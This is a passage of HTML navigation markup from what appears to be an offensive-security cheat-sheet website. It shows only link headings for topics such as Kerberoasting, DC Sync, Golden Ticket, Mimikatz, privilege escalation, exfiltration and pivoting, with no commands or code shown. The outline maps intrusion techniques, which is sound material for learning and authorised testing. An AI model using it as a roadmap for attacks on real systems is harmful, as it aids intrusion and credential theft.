    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory" class="md-nav__link">
    <span class="md-ellipsis">
      🗃Active Directory
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🗃Active Directory">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_2" class="md-nav__link">
    <span class="md-ellipsis">
      🔍Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🔍Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ad-enumeration-script" class="md-nav__link">
    <span class="md-ellipsis">
      ad-enumeration-script
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netexec" class="md-nav__link">
    <span class="md-ellipsis">
      Netexec
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation_1" class="md-nav__link">
    <span class="md-ellipsis">
      💥Exploitation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="💥Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#url-file-attack" class="md-nav__link">
    <span class="md-ellipsis">
      URL File Attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#backup-operator" class="md-nav__link">
    <span class="md-ellipsis">
      Backup operator
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#as-rep-roasting" class="md-nav__link">
    <span class="md-ellipsis">
      AS-REP Roasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberoasting" class="md-nav__link">
    <span class="md-ellipsis">
      Kerberoasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#silver-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      Silver Ticket
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dc-sync-attack" class="md-nav__link">
    <span class="md-ellipsis">
      DC Sync Attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#loggedon-user-impersonation" class="md-nav__link">
    <span class="md-ellipsis">
      LoggedOn User Impersonation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dacl-abuse" class="md-nav__link">
    <span class="md-ellipsis">
      DACL Abuse
    </span>
  </a>
  
    <nav class="md-nav" aria-label="DACL Abuse">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-genericall-on-a-user-reset-password-full-control" class="md-nav__link">
    <span class="md-ellipsis">
      1. GenericAll on a User – Reset Password (Full Control)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-genericwrite-on-user-modify-scriptpath-or-spn-kerberoasting" class="md-nav__link">
    <span class="md-ellipsis">
      2. GenericWrite on User – Modify scriptPath or SPN (Kerberoasting)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2. GenericWrite on User – Modify scriptPath or SPN (Kerberoasting)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#shadow-credentials-attack-to-grab-ntlm-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Shadow Credentials Attack - to grab NTLM Hash
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#delegation-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Delegation Attacks
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Delegation Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#unconstrained-delegation-abuse" class="md-nav__link">
    <span class="md-ellipsis">
      🟥 Unconstrained Delegation Abuse
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#constrained-delegation-abuse" class="md-nav__link">
    <span class="md-ellipsis">
      🟨 Constrained Delegation Abuse
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#resource-based-constrained-delegation-rbcd-abuse" class="md-nav__link">
    <span class="md-ellipsis">
      🟩 Resource-Based Constrained Delegation (RBCD) Abuse
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#adcs-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      ADCS Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap-passback-attack" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP Passback Attack
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#lateral-movement-in-ad" class="md-nav__link">
    <span class="md-ellipsis">
      🚶‍♂️Lateral Movement in AD
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🚶‍♂️Lateral Movement in AD">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#initial-access_1" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Access
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wmi-port-135" class="md-nav__link">
    <span class="md-ellipsis">
      WMI (port 135)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#winrm-5985-5986" class="md-nav__link">
    <span class="md-ellipsis">
      WinRM (5985, 5986)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#psexec-smb" class="md-nav__link">
    <span class="md-ellipsis">
      PsExec (SMB)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Pass The Hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#overpass-the-hash-request-tgttgs-using-hash" class="md-nav__link">
    <span class="md-ellipsis">
      OverPass The Hash - Request TGT/TGS using Hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      Pass The Ticket
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rdp-hijacking" class="md-nav__link">
    <span class="md-ellipsis">
      RDP Hijacking
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence" class="md-nav__link">
    <span class="md-ellipsis">
      Persistence
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Persistence">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#golden-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      Golden Ticket
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shadow-copies" class="md-nav__link">
    <span class="md-ellipsis">
      Shadow Copies
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#more_2" class="md-nav__link">
    <span class="md-ellipsis">
      More
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#meterpreter-be-cautious-to-use-only-one-1-machine" class="md-nav__link">
    <span class="md-ellipsis">
      Meterpreter (Be Cautious to Use only one 1 Machine)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#important-payloads" class="md-nav__link">
    <span class="md-ellipsis">
      Important payloads
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#aws" class="md-nav__link">
    <span class="md-ellipsis">
      ☁AWS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="☁AWS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-recon" class="md-nav__link">
    <span class="md-ellipsis">
      Domain Recon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#service-specific" class="md-nav__link">
    <span class="md-ellipsis">
      Service Specific
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Service Specific">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#s3-bucket" class="md-nav__link">
    <span class="md-ellipsis">
      S3 bucket
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration-thru-api" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration thru API
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Enumeration thru API">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#identify-the-aws-account-id-from-a-public-s3-bucket" class="md-nav__link">
    <span class="md-ellipsis">
      Identify the AWS Account ID from a Public S3 Bucket
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#to-filter-search" class="md-nav__link">
    <span class="md-ellipsis">
      To filter &amp; search
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../11_Code_And_Exploits/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    💥 Code &amp; Exploits CheatSheet
    
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#tool-docs" class="md-nav__link">
    <span class="md-ellipsis">
      Tool Docs
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attacker-machine-commands" class="md-nav__link">
    <span class="md-ellipsis">
      Attacker Machine Commands
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacker Machine Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#general-linux-commands" class="md-nav__link">
    <span class="md-ellipsis">
      General Linux Commands
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#general-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      General Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#service-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Service Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Service Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dns" class="md-nav__link">
    <span class="md-ellipsis">
      DNS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#https" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP(S)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb" class="md-nav__link">
    <span class="md-ellipsis">
      SMB
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#snmp" class="md-nav__link">
    <span class="md-ellipsis">
      SNMP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smtppop3imap" class="md-nav__link">
    <span class="md-ellipsis">
      SMTP/POP3/IMAP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ftp" class="md-nav__link">
    <span class="md-ellipsis">
      FTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc" class="md-nav__link">
    <span class="md-ellipsis">
      RPC
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#oracle-database-1521" class="md-nav__link">
    <span class="md-ellipsis">
      Oracle Database (1521)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unknown-ports" class="md-nav__link">
    <span class="md-ellipsis">
      Unknown ports
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-services" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Services
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SQL Services">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-commands" class="md-nav__link">
    <span class="md-ellipsis">
      Sql Commands
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bruteforcing" class="md-nav__link">
    <span class="md-ellipsis">
      🔢Bruteforcing
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🔢Bruteforcing">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#wordlist" class="md-nav__link">
    <span class="md-ellipsis">
      Wordlist
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Wordlist">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#some-important-mutation-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Some Important Mutation rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#some-important-wordlists" class="md-nav__link">
    <span class="md-ellipsis">
      Some important wordlists
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      💥Exploitation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="💥Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#payload-creation" class="md-nav__link">
    <span class="md-ellipsis">
      Payload Creation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#evasion" class="md-nav__link">
    <span class="md-ellipsis">
      Evasion
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-transfer-delivery" class="md-nav__link">
    <span class="md-ellipsis">
      🚚File Transfer (Delivery)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#initial-access" class="md-nav__link">
    <span class="md-ellipsis">
      🚪Initial Access
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extras" class="md-nav__link">
    <span class="md-ellipsis">
      Extras
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attacker-from-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Attacker From Windows
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web-attack" class="md-nav__link">
    <span class="md-ellipsis">
      🕸 Web Attack
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#client-side-attack" class="md-nav__link">
    <span class="md-ellipsis">
      🧑 Client Side Attack
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🧑 Client Side Attack">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#microsoft-windows-library-file" class="md-nav__link">
    <span class="md-ellipsis">
      Microsoft Windows Library File
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#victim-linux-commands" class="md-nav__link">
    <span class="md-ellipsis">
      🐧 Victim Linux Commands
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🐧 Victim Linux Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#for-more" class="md-nav__link">
    <span class="md-ellipsis">
      For more
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#stabilizing-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Stabilizing shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      🔍Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🔍Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#user-operating-system" class="md-nav__link">
    <span class="md-ellipsis">
      User &amp; Operating System
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#network" class="md-nav__link">
    <span class="md-ellipsis">
      Network
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cronjobs" class="md-nav__link">
    <span class="md-ellipsis">
      Cronjobs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#misconfigured-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      Misconfigured Permissions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#drives-devices-and-packages" class="md-nav__link">
    <span class="md-ellipsis">
      Drives, devices and packages
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#processes-services" class="md-nav__link">
    <span class="md-ellipsis">
      Processes &amp; services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#searching-commands" class="md-nav__link">
    <span class="md-ellipsis">
      Searching Commands
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#imp-files" class="md-nav__link">
    <span class="md-ellipsis">
      🗄 Imp Files
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-transfer-download" class="md-nav__link">
    <span class="md-ellipsis">
      📂File Transfer (Download)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="📂File Transfer (Download)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#upload-exfiltration" class="md-nav__link">
    <span class="md-ellipsis">
      (Upload) - Exfiltration
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc-vectors" class="md-nav__link">
    <span class="md-ellipsis">
      ⬆ PrivEsc Vectors
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#victim-windows-commands" class="md-nav__link">
    <span class="md-ellipsis">
      🪟 Victim Windows Commands
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🪟 Victim Windows Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_1" class="md-nav__link">
    <span class="md-ellipsis">
      🔍Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🔍Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#user-system-info" class="md-nav__link">
    <span class="md-ellipsis">
      User &amp; System info
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#networking" class="md-nav__link">
    <span class="md-ellipsis">
      Networking
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#installed-apps" class="md-nav__link">
    <span class="md-ellipsis">
      Installed apps
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-files" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell Files
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#running-processes" class="md-nav__link">
    <span class="md-ellipsis">
      Running Processes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-services" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#scheduled-tasks" class="md-nav__link">
    <span class="md-ellipsis">
      Scheduled Tasks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#more" class="md-nav__link">
    <span class="md-ellipsis">
      More
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#searching-commands_1" class="md-nav__link">
    <span class="md-ellipsis">
      Searching Commands
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#imp-files_1" class="md-nav__link">
    <span class="md-ellipsis">
      🗄 Imp Files
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    <span class="md-ellipsis">
      Mimikatz
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Mimikatz">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#av-enabled-machine" class="md-nav__link">
    <span class="md-ellipsis">
      AV enabled machine
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-transfer-download_1" class="md-nav__link">
    <span class="md-ellipsis">
      📂File Transfer (Download)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="📂File Transfer (Download)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#upload-exfiltration_1" class="md-nav__link">
    <span class="md-ellipsis">
      (Upload) - Exfiltration
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc-vectors_1" class="md-nav__link">
    <span class="md-ellipsis">
      ⬆ PrivEsc Vectors
    </span>
  </a>
  
    <nav class="md-nav" aria-label="⬆ PrivEsc Vectors">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#access-after-creds" class="md-nav__link">
    <span class="md-ellipsis">
      Access After Creds
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#misconfiguredexcessive-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Misconfigured/Excessive Privileges
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Misconfigured/Excessive Privileges">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#seimpersonateprivilege-potato-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      SeImpersonatePrivilege (Potato Attacks)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SeImpersonatePrivilege (Potato Attacks)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#local-service-account-with-no-seimpersonate" class="md-nav__link">
    <span class="md-ellipsis">
      Local Service Account with no SeImpersonate
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sebackupprivilege" class="md-nav__link">
    <span class="md-ellipsis">
      SeBackupPrivilege
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#serestoreprivilege" class="md-nav__link">
    <span class="md-ellipsis">
      SeRestorePrivilege
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#semanagevolumeprivilege" class="md-nav__link">
    <span class="md-ellipsis">
      SeManageVolumePrivilege
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#semachineaccountprivilege" class="md-nav__link">
    <span class="md-ellipsis">
      SeMachineAccountPrivilege
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Group Privileges
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Group Privileges">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#server-operator-group" class="md-nav__link">
    <span class="md-ellipsis">
      Server operator group
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#secrets-extraction-using-dpapi" class="md-nav__link">
    <span class="md-ellipsis">
      Secrets extraction using DPAPI
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc-thru-service" class="md-nav__link">
    <span class="md-ellipsis">
      PrivEsc Thru SERVICE
    </span>
  </a>
  
    <nav class="md-nav" aria-label="PrivEsc Thru SERVICE">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#to-check-service-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      To check service permissions
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#always-install-elevated-msi" class="md-nav__link">
    <span class="md-ellipsis">
      Always Install Elevated - MSI
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#autorun-program-hijack-or-startup-app" class="md-nav__link">
    <span class="md-ellipsis">
      AutoRun Program Hijack Or Startup App
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypass-uac" class="md-nav__link">
    <span class="md-ellipsis">
      Bypass UAC
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#useful-commands" class="md-nav__link">
    <span class="md-ellipsis">
      Useful commands
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pivoting-commands" class="md-nav__link">
    <span class="md-ellipsis">
      ⛓ Pivoting Commands
    </span>
  </a>
  
    <nav class="md-nav" aria-label="⛓ Pivoting Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ligolo-ng" class="md-nav__link">
    <span class="md-ellipsis">
      Ligolo-ng
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#chisel" class="md-nav__link">
    <span class="md-ellipsis">
      Chisel
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#more_1" class="md-nav__link">
    <span class="md-ellipsis">
      More
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory" class="md-nav__link">
    <span class="md-ellipsis">
      🗃Active Directory
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🗃Active Directory">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_2" class="md-nav__link">
    <span class="md-ellipsis">
      🔍Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🔍Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ad-enumeration-script" class="md-nav__link">
    <span class="md-ellipsis">
      ad-enumeration-script
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netexec" class="md-nav__link">
    <span class="md-ellipsis">
      Netexec
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation_1" class="md-nav__link">
    <span class="md-ellipsis">
      💥Exploitation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="💥Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#url-file-attack" class="md-nav__link">
    <span class="md-ellipsis">
      URL File Attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#backup-operator" class="md-nav__link">
    <span class="md-ellipsis">
      Backup operator
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#as-rep-roasting" class="md-nav__link">
    <span class="md-ellipsis">
      AS-REP Roasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberoasting" class="md-nav__link">
    <span class="md-ellipsis">
      Kerberoasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#silver-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      Silver Ticket
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dc-sync-attack" class="md-nav__link">
    <span class="md-ellipsis">
      DC Sync Attack
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#loggedon-user-impersonation" class="md-nav__link">
    <span class="md-ellipsis">
      LoggedOn User Impersonation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dacl-abuse" class="md-nav__link">
    <span class="md-ellipsis">
      DACL Abuse
    </span>
  </a>
  
    <nav class="md-nav" aria-label="DACL Abuse">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-genericall-on-a-user-reset-password-full-control" class="md-nav__link">
    <span class="md-ellipsis">
      1. GenericAll on a User – Reset Password (Full Control)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-genericwrite-on-user-modify-scriptpath-or-spn-kerberoasting" class="md-nav__link">
    <span class="md-ellipsis">
      2. GenericWrite on User – Modify scriptPath or SPN (Kerberoasting)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2. GenericWrite on User – Modify scriptPath or SPN (Kerberoasting)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#shadow-credentials-attack-to-grab-ntlm-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Shadow Credentials Attack - to grab NTLM Hash
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#delegation-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Delegation Attacks
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Delegation Attacks">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#unconstrained-delegation-abuse" class="md-nav__link">
    <span class="md-ellipsis">
      🟥 Unconstrained Delegation Abuse
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#constrained-delegation-abuse" class="md-nav__link">
    <span class="md-ellipsis">
      🟨 Constrained Delegation Abuse
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#resource-based-constrained-delegation-rbcd-abuse" class="md-nav__link">
    <span class="md-ellipsis">
      🟩 Resource-Based Constrained Delegation (RBCD) Abuse
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#adcs-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      ADCS Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap-passback-attack" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP Passback Attack
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#lateral-movement-in-ad" class="md-nav__link">
    <span class="md-ellipsis">
      🚶‍♂️Lateral Movement in AD
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🚶‍♂️Lateral Movement in AD">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#initial-access_1" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Access
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wmi-port-135" class="md-nav__link">
